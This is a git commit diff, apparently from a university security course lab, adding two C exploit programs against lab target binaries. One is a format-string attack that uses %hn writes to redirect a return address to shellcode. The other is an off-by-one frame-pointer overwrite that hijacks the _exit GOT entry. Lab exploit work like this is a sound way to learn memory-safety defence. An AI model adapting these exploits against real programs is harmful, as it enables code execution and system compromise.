78f4d04f67e040e4e65af30d9ce561b3828aee54
Luis Perez <luis0@stanford.edu>
2018-04-18 21:38:26 -0700

    Exploit 5 and 6 completed

--- proj1/sploits/sploit5.c
+++ proj1/sploits/sploit5.c
@@ -9,9 +9,42 @@
 
 int main(void)
 {
-	// By inspection, we find the EIP address to be:
-	int EIP_ADDRESS = 0xbffffe70;
-	char sploitstring[] = "%08x %08x %08x %08x %08x\n";
+	// We're little endian, so this is in reverse.
+	// EIP: 0xbffffe20.
+	char EIP_ADDRESS[] = "\x20\xfe\xff\xbf";
+	char OFFSET_EIP_ADDRESS[] = "\x22\xfe\xff\xbf";
+
+	// We need to write a particular number of characters to our string in order
+	// to write the right value to our address.
+	// We want to pass control to address is 0xbfffffc1 (our shellcode).
+	// We always read $1 for padding, and we force $1 and $2 for locations to
+	// write.
+	// For 0xbfff we need 49151 bytes, (-8) = 49143.
+	// For 0xffc1 we need 65473 nytes, (-49151) = 16322
+	char TOP_ORDER_BYTES_EXPLOIT[] = "%1$49143x%2$hn";
+	char LOW_ORDER_BYTES_EXPLOIT[] = "%1$16322x%1$hn";
+
+	char sploitstring[400];
+	memset(sploitstring, '\x90', sizeof(sploitstring));
+	char* curr = sploitstring;
+
+	// 1$ is our memory address.
+	// 2$ is our second memory address (offset by 2), since we write 2 bytes at a
+	// time.
+	// All other arguments should never be accessed.
+	memcpy(curr, EIP_ADDRESS, sizeof(EIP_ADDRESS) - 1);
+	curr += sizeof(EIP_ADDRESS) - 1;
+	memcpy(curr, OFFSET_EIP_ADDRESS, sizeof(OFFSET_EIP_ADDRESS) - 1);
+	curr += sizeof(OFFSET_EIP_ADDRESS) - 1;
+	memcpy(curr, TOP_ORDER_BYTES_EXPLOIT, sizeof(TOP_ORDER_BYTES_EXPLOIT) - 1);
+	curr += sizeof(TOP_ORDER_BYTES_EXPLOIT) - 1;
+	memcpy(curr, LOW_ORDER_BYTES_EXPLOIT, sizeof(LOW_ORDER_BYTES_EXPLOIT) - 1);
+	curr += sizeof(LOW_ORDER_BYTES_EXPLOIT) - 1;
+
+	// We now copy the shellcode. The only requirement is that the low order
+	// bytes are larger than the top order bytes in buffer.
+	memcpy(curr, shellcode, sizeof(shellcode));
+
 	char *args[] = { TARGET, sploitstring, NULL };
 	char *env[] = { NULL };
 
--- proj1/sploits/sploit6.c
+++ proj1/sploits/sploit6.c
@@ -9,11 +9,33 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
-  char *env[] = { NULL };
+	int _EXIT_GOT_ADDRESS = 0x804a00c;
+	// Mostly interested because this is a NOOP and will allow foo() to return.
+	int EXPLOIT_ADDRESS = 0xbffffd10;
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+	// We make the explot one byte (+ null char) too large.
+	char sploitstring[202 * sizeof(char)];
 
-  return 0;
+	// Fill with NOOPs and null terminate.
+	memset(sploitstring, '\x90', sizeof(sploitstring));
+	sploitstring[sizeof(sploitstring) - 1] = 0;
+
+	// The value of our target ebp is 0xbffffda8. We can change the lower byte
+	// 0x68 to whatever we want. We want the address to be 0xbffffd00, which is
+	// 64 bytes into our buffer.
+	// This clears the lower byte a bit.
+	sploitstring[sizeof(sploitstring) - 2] = 0x8;
+	// This is setting our "a" local.
+	*(int*)(sploitstring + 64) = EXPLOIT_ADDRESS;
+	// This is setting our "*p" local.
+	*(int*)(sploitstring + 68) = _EXIT_GOT_ADDRESS;
+	memcpy(sploitstring + 120, shellcode, sizeof(shellcode) - 1);
+
+	char *args[] = { TARGET, sploitstring, NULL };
+	char *env[] = { NULL };
+
+	execve(TARGET, args, env);
+	fprintf(stderr, "execve failed.\n");
+
+	return 0;
 }
